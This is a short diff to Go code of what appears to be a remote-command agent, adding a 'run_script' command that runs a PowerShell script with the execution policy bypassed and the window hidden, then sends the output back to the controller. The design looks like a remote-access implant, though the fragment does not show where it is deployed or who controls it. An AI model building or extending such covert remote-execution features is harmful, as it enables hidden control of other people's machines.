@@ -124,6 +124,10 @@ func executeCommandAndSendResult(cmd Command) {
             publicIp(cmd)
     case cmd.Cmd == "powershell":
            execPowerShellAndSendResult(cmd)
+    case strings.HasPrefix(cmd.Cmd, "run_script "):
+           scriptPath := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "run_script"))
+           runPowerShellScript(cmd, scriptPath)
+
     default:
         executeOtherCommand(cmd)
     }
@@ -280,6 +284,27 @@ func publicIp(cmd Command) {
     sendResult(CommandResult{
         ID:     cmd.ID,
         Result: publicIP,
+    })
+}
+
+func runPowerShellScript(cmd Command, scriptPath string) {
+    // Always use -File to execute scripts, with safe defaults
+    command := exec.Command("powershell.exe",
+        "-NoProfile",
+        "-ExecutionPolicy", "Bypass",
+        "-File", scriptPath,
+    )
+    command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+    output, err := command.CombinedOutput()
+    resultText := string(output)
+    if err != nil {
+        resultText += "\nError: " + err.Error()
+    }
+
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: resultText,
     })
 }
 
